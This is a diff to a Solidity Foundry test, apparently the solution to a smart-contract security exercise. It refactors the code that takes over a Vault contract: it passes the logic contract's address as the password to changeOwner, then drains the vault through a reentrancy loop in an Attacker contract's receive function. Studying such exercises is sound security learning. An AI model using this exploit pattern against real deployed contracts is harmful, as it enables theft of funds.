@@ -32,10 +32,10 @@ contract VaultExploiter is Test {
 
         // add your hacker code.
         Attacker attack = new Attacker(payable(address(vault)));
-        bytes32 passWord = bytes32(uint256(uint160(address(logic))));
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
         bytes memory data = abi.encodeWithSignature(
             "changeOwner(bytes32,address)",
-            passWord,
+            password,
             address(attack)
         );
         (bool success,) = address(vault).call(data);
@@ -49,21 +49,21 @@ contract VaultExploiter is Test {
 }
 
 contract Attacker {
-    address payable public vault;
+    Vault public vault;
 
     constructor(address payable _vault) {
-        vault =_vault;
+        vault = Vault(_vault);
     }
 
     function attack() public payable {
-        Vault(vault).openWithdraw();
-        Vault(vault).deposite{value: msg.value}();
-        Vault(vault).withdraw();
+        vault.openWithdraw();
+        vault.deposite{value: msg.value}();
+        vault.withdraw();
     }
     
     receive() external payable {
-        if (vault.balance > 0) {
-            Vault(vault).withdraw();
+        if (address(vault).balance > 0) {
+            vault.withdraw();
         }
     }
 }
